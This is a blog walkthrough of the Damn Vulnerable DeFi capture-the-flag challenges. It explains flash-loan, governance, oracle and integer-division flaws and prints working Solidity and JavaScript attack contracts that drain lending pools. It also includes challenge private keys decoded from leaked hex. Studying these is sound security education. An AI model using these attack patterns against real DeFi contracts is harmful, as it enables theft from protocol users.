---
title: Damn Vulnerable DeFi Solutions
date: 2021-01-03
image: ./featured.png
categories:
  - Tech
  - ETH
  - security
medium:
  - eos
  - Programming
  - blockchain
  - cryptocurrency
  - javascript
steem:
  - eos
  - utopian-io
  - steemdev
  - programming
  - cryptocurrency
---

DeFi protocols come with novel innovations that haven't been possible in traditional finance like flash loans.
This opens new attack vectors that need to be considered when designing these protocols.
Recently, OpenZeppelin released their [Damn Vulnerable DeFi CTF challenges](https://www.damnvulnerabledefi.xyz/).

They are a lot of fun and it's a great way to get started with DeFi or ETH development in general.
Unlike other CTFs everything runs on your local node, so no need to do waste time on getting set up like managing private keys, getting testnet ether, copying code to your local machine, etc.
Give it a try!
You can see my solutions for all challenges [in this GitHub repo](https://github.com/MrToph/damn-vulnerable-defi) and I'll provide a quick walkthrough here.

# Challenges

## 1. Unstoppable

In this challenge, you need to break the functionality of the flash loan contract.
The contract tracks its available balance in a storage variable `poolBalance` and requires this variable to **equal** the contract's actual token balance `token.balanceOf(address(this))`.
An easy way to create an imbalance is by sending tokens to the contract directly through the token's `transfer` function without using the flash loan contract's `deposit` function.

## 2. Naive receiver

This challenge consists of a user contract interacting with a flash loan contract that takes a heavy fee on each flash loan.
The goal is to drain the user's contract.
The issue here is that the user contract does not authenticate the user to be the owner, so anyone can just take any flash loan on behalf of that contract.
It checks if `msg.sender` is the flash loan contract but this is always the case as the callback function is invoked from the flash loan contract.

To solve this challenge in a single transaction we can deploy a contract that repeatedly takes flash loans on the user contract's behalf until its balance is less than the flash loan fee.

```solidity
function attack(
    INaiveReceiverLenderPool pool,
    address payable receiver
) public {
    uint256 FIXED_FEE = pool.fixedFee();
    while (receiver.balance >= FIXED_FEE) {
        pool.flashLoan(receiver, 0);
    }
}
```

## 3. Truster

This challenge involves another flash loan contract offering loans for the DVT token. The goal is to steal them.
The flash loan contract accepts a custom function to call and a payload as its argument. This allows us to call any contract function on the flash loan contract's behalf which can be exploited.
First, we take a flash loan of `0` tokens (such that no repayment is required) and pass the token's `approve` function as arguments with a payload that approves our attacker to withdraw all funds in a subsequent transaction.
This works because the context under which `approve` is executed is the flash loan contract because it is the one calling it.

Again, we can write a custom contract that combines both steps in a single function/transaction.

```solidity
function attack(IERC20 token, ITrusterLenderPool pool, address attackerEOA)
    public
{
    uint256 poolBalance = token.balanceOf(address(pool));
    // IERC20::approve(address spender, uint256 amount)
    // flashloan executes "target.call(data);", approve our contract to withdraw all liquidity
    bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
    pool.flashLoan(0, attackerEOA, address(token), approvePayload);

    // once approved, use transferFrom to withdraw all pool liquidity
    token.transferFrom(address(pool), attackerEOA, poolBalance);
}
```

## 4. Side entrance

This time the flash loan contract has an integrated accounting system (`balances` storage variable) that allows anyone to deposit and withdraw their liquidity.
The issue is that, when taking a flash loan, the contract only checks if the contract's _token_ balance has not decreased - but the accounting system is ignored.
We can take a flash loan and in the callback deposit the funds again which will credit our attacker with the same balance.
The flash loan check passes as the tokens are still in the flash loan contract because of the deposit.
Afterwards, we can withdraw the funds.

```solidity
function attack()
    public
{
    // calls execute, then checks pool balance
    _pool.flashLoan(_poolBalance);

    _pool.withdraw();
    _attackerEOA.transfer(_poolBalance);
}

// called by ISideEntranceLenderPool::flashLoan
function execute() external payable {
    // deposit the tokens again, crediting the attacker contract
    // and passing the flash loan balance check
    _pool.deposit{value: _poolBalance}();
}

// needed for pool.withdraw() to work
receive() external payable {}
```

## 5. The rewarder

In this challenge, there is a _reward contract_ in addition to the flash loan contract.
The reward contract pays out rewards every 5 days based on a snapshot token balance.
As a general rule, if some logic relies on a single snapshot in time instead of continuous/aggregated data points, it can be manipulated by flash loans.
This is also true here, we can wait until rewards are being distributed again, take a huge flash loan, and deposit all tokens from the flash loan to the reward pool.
Its `deposit` function creates a new snapshot of the current token balances and immediately distributes the rewards.
Due to our token balance and thus our share of the overall tokens in the reward pool being so high, the integer division results in all other accounts receiving `0` rewards.

```solidity
function attack() public {
    // take a flash loan, deposit into rewards pool
    // receive rewards, pay back flash loan

    uint256 flashLoanBalance =
        liquidityToken.balanceOf(address(flashLoanPool));
    // approve amount of flashloan for rewarderPool.deposit
    liquidityToken.approve(address(rewarderPool), flashLoanBalance);
    flashLoanPool.flashLoan(flashLoanBalance);

    // send reward tokens to attacker EOA
    require(rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
    bool success =
        rewardToken.transfer(
            msg.sender,
            rewardToken.balanceOf(address(this))
        );
    require(success, "reward transfer failed");
}

// called by IFlashLoanerPool::flashLoan
function receiveFlashLoan(uint256 amount) external {
    // deposit distributes rewards already
    rewarderPool.deposit(amount);
    rewarderPool.withdraw(amount);
    // pay back to flash loan sender
    liquidityToken.transfer(address(flashLoanPool), amount);
}
```

## 6. Selfie

This challenge is similar to the previous one.
A governance contract accepting majority token holder decisions can be abused by taking a flash loan.
We deposit the flash loan making our attacker a governance token whale which we can use to queue a governance action to drain all funds.

```solidity
function attack() public {
    uint256 flashLoanBalance = token.balanceOf(address(pool));
    attackerEOA = msg.sender;

    // get flash loan
    pool.flashLoan(flashLoanBalance);
}

// called by ISelfiePool::flashLoan
function receiveTokens(
    address, /* tokenAddress */
    uint256 amount
) external {
    // received tokens => take a snapshot because it's checked in queueAction
    token.snapshot();

    // we can now queue a government action to drain all funds to attacker account
    // because it checks the balance of governance tokens (which is the same token as the pool token)
    bytes memory drainAllFundsPayload =
        abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
    // store actionId so we can later execute it
    actionId = governance.queueAction(
        address(pool),
        drainAllFundsPayload,
        0
    );

    // pay back to flash loan sender
    token.transfer(address(pool), amount);
}
```

## 7. Compromised

The seventh challenge deals with an NFT exchange contract that automatically buys and sells certain NFTs at a price determined by an oracle.
The oracle itself uses three externally owned accounts as price feeders and returns the median of the reported prices.
Our goal is to manipulate the price to buy a cheap NFT, then manipulate the price again to sell this NFT for a huge profit.
As the oracle uses the median we need to manipulate at least two oracles to be able to change the price.

The [challenge description](https://www.damnvulnerabledefi.xyz/challenges/7.html) shows an excerpt of a HTTP response with some hex data:

```python
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

After decoding this hex data, we get a base64 string.
Which we can decode again to receive the following:

```python
1. Leaked data: 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
2. Decoded from hex: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
3. Private key from base64: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

4. Leaked data: 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
5. Decoded from hex: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
6. Private key from base64: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

The result for each decoding is a 32-byte string.
Ethereum uses elliptic curve cryptography, more specifically the secp256k1 curve, which has 32-byte scalars.
These scalars are used as private keys of accounts.
The public key is this private key multiplied by the generator point and has ~33 bytes as you only need to encode the x coordinate and a flag which one of the two y-coordinates it is.
The address, in turn, is the 20 lower bytes of the keccak256 hash of this public key.

Which means we can interpret these two hex strings as private keys and check what addresses they correspond to.
I used the following JS code for that:

```js
const leakToPrivateKey = leak => {
  console.log(`1. Leaked data: ${leak}`)
  const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`)
  console.log(`2. Decoded from hex: ${base64}`)
  const hexKey = Buffer.from(base64, `base64`).toString(`utf8`)
  console.log(`3. Private key from base64: ${hexKey}`)
  return hexKey
}

// codes from https://www.damnvulnerabledefi.xyz/challenges/7.html
const compromisedOracles = [
  leakToPrivateKey(
    `4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`
  ),
  leakToPrivateKey(
    `4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`
  ),
].map(privateKeyHex => {
  // important to keep the `0x` prefix
  return web3.eth.accounts.privateKeyToAccount(privateKeyHex)
})

console.log(
  `Compromised oracles addresses: ${compromisedOracles
    .map(acc => acc.address)
    .join(` `)}`
)
// Compromised oracles addresses: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15 0x81A5D6E50C214044bE44cA0CB057fe119097850c
```

Indeed, we found the private keys for the last two oracle sources which allow [modifying the price and buying / selling NFTs for profit](https://github.com/MrToph/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L69-L147).


```js
// 1. reduce NFT price to buy it cheap
const reducedPrice = ether(`0.1`)
await changePrice(reducedPrice.toString());

// 2. buy 1 NFT at this price
await this.exchange.buyOne({ from: attacker, value: reducedPrice });

// 3. increase NFT price to drain all Funds
const exchangeBalance = await balance.current(this.exchange.address);
await changePrice(exchangeBalance.toString());

// 4. approve transferFrom of 1 DVNFT token and sell it
await this.token.approve(this.exchange.address, 1, { from: attacker });
const FIRST_TOKEN_ID = 1;
await this.exchange.sellOne(FIRST_TOKEN_ID, { from: attacker });
```

## 8. Puppet

This is a great challenge because it uses an actual Uniswap V1 pool.
In addition to it, there is a lending contract requiring your collateral to be worth twice as much as your loan.
We try to empty the lending pool tokens without having to put up twice the value in collateral first.

The lending pool needs to know how much the tokens you want to borrow are worth because it needs to compute the collateral requirements.
It uses a `computeOraclePrice` function that computes the spot price of the Uniswap reserves which is already exploitable in and of itself by a flash loan:
Get a huge flash loan, trade a huge amount into the Uniswap pool, drastically skewing the oracle price, borrow tokens from the lending pool at a discount, then "unwind" the Uniswap pool by doing the reverse trade, and finally pay back the flash loan.

However, there is no flash loan in this challenge, instead, another bug in the `computeOraclePrice` function makes this easily exploitable - it uses integer division to compute the price as:

```solidity
function computeOraclePrice() public view returns (uint256) {
    // this is wrong and will be 0 due to integer division as soon as the pool's token balance > ETH balance
    return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
}
```

A correct implementation should multiply by the `borrowAmount` first before dividing by the token balance to circumvent this issue.

Then the exploit steps are:

1. Trade a tiny amount of DVT to ETH (such that token balance > ETH balance in the Uniswap pool). This results in `computeOraclePrice` returning `0`.
2. borrow all pool tokens at zero price

```solidity
function attack(uint256 amount) public {
    // trade tokens to ETH to increase tokens balance in uniswap
    require(token.balanceOf(address(this)) >= amount, "not enough tokens");
    token.approve(address(uniswap), amount);
    uint256 ethGained =
        uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);

    // computeOraclePrice has integer division issue which will make price 0
    // as soon as token balance is greater than ETH balance
    require(pool.computeOraclePrice() == 0, "oracle price not 0");

    // now borrow everything from the pool at a price of 0
    pool.borrow(token.balanceOf(address(pool)));

    // success condition is that attacker's ETH balance did not decrease
    // but it reduced due to gas cost, just send back the eth we gained from the swap
    // transfer all tokens & eth to attacker EOA
    require(
        token.transfer(msg.sender, token.balanceOf(address(this))),
        "token transfer failed"
    );
    msg.sender.transfer(ethGained);
}

// required to receive ETH from uniswap
receive() external payable {}
```


> ❕ The full code for all solutions can be [found on GitHub](https://github.com/MrToph/damn-vulnerable-defi).

For more Ethereum CTFs, check out my other solutions:

- Damn Vulnerable DeFi
- [Ethernaut](/ethernaut-solutions)
- [Capture The Ether](/capture-the-ether-solutions/)